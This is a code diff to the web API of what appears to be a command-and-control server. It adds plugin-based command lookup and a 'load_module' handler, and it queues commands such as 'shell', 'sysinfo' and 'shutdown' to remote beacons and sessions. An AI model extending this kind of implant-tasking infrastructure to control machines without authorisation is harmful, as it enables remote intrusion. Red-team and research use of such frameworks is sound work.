@@ -10,6 +10,26 @@ from Modules.global_objects import beacon_list, logger, sessions_list
 from .auth_handler import require_auth
 
 
+def _get_multihandler_commands():
+    """
+    Get the MultiHandlerCommands instance to access loaded plugins.
+
+    Returns:
+        MultiHandlerCommands instance or None if not available
+    """
+    try:
+        from Modules.global_objects import config
+        from Modules.multi_handler.multi_handler_commands import MultiHandlerCommands
+
+        # Create a temporary instance just to get commands
+        # In a real implementation, this should be cached/singleton
+        temp_handler = MultiHandlerCommands(config, None)
+        return temp_handler
+    except Exception as e:
+        logger.error(f"Failed to get multihandler commands: {e}")
+        return None
+
+
 def handle_get_commands(server):
     """
     Handle available commands request.
@@ -58,6 +78,8 @@ def handle_post_command(server):
     data = request_data.get("data")
     command = request_data.get("command")
 
+    logger.debug(f"Command request - UUID: {uuid}, Command: {command}, Data: {data}")
+
     if not uuid or not command:
         return jsonify({"error": "Missing uuid or command"}), 400
 
@@ -74,7 +96,48 @@ def handle_post_command(server):
         if not beacon_obj:
             return jsonify({"error": "Beacon not found"}), 404
 
-        add_beacon_command_list(uuid, None, command, beacon_obj.database, data)
+        # Handle special case for load_module command
+        if command == "load_module":
+            # For load_module, data should contain the module name
+            if not data:
+                return jsonify({"error": "Module name required for load_module"}), 400
+
+            # Extract module name from data
+            if isinstance(data, dict):
+                module_name = data.get("name") or data.get("module")
+            else:
+                module_name = str(data)
+
+            if not module_name:
+                return jsonify({"error": "Module name not provided"}), 400
+
+            # Queue the load_module command with proper format
+            command_data = {"name": module_name}
+            add_beacon_command_list(
+                uuid, None, "load_module", beacon_obj.database, command_data
+            )
+            logger.info(
+                f"Module load command issued to {uuid} by {username}: {module_name}"
+            )
+            return jsonify(
+                {"status": "module load queued", "uuid": uuid, "module": module_name}
+            )
+
+        # Ensure data is properly formatted for other commands
+        # If data is None, pass None (will be converted to {} in add_beacon_command_list)
+        # If data is a string, wrap it in a dict
+        # If data is already a dict, use as-is
+        command_data = None
+        if data is not None:
+            if isinstance(data, str):
+                command_data = {"args": data} if data else None
+            elif isinstance(data, dict):
+                command_data = data
+            else:
+                # For other types, convert to string and wrap
+                command_data = {"data": str(data)}
+
+        add_beacon_command_list(uuid, None, command, beacon_obj.database, command_data)
         logger.info(f"Command '{command}' issued to {uuid} by {username}")
     except Exception as e:
         logger.error(f"Failed to add command to beacon/session {uuid}: {e}")
@@ -93,7 +156,35 @@ def _get_available_commands(implant_uuid):
     Returns:
         list of available commands or dict with error
     """
-    available_commands = {"beacon": ["test"], "session": ["test2"]}
+    # Get commands from multihandler plugins
+    handler = _get_multihandler_commands()
+
+    if handler:
+        beacon_commands = handler.list_loaded_beacon_commands()
+        session_commands = handler.list_loaded_session_commands()
+    else:
+        # Fallback to basic commands if multihandler not available
+        beacon_commands = ["shell", "close", "session", "sysinfo"]
+        session_commands = ["shell", "close", "beacon", "sysinfo"]
+
+    # Add built-in commands that are always available
+    beacon_commands_full = list(
+        set(
+            beacon_commands
+            + ["shell", "close", "session", "shutdown", "sysinfo", "load_module"]
+        )
+    )
+    session_commands_full = list(
+        set(
+            session_commands
+            + ["shell", "close", "beacon", "shutdown", "sysinfo", "load_module"]
+        )
+    )
+
+    available_commands = {
+        "beacon": sorted(beacon_commands_full),
+        "session": sorted(session_commands_full),
+    }
 
     # Check beacons
     for userID, beacon in beacon_list.items():
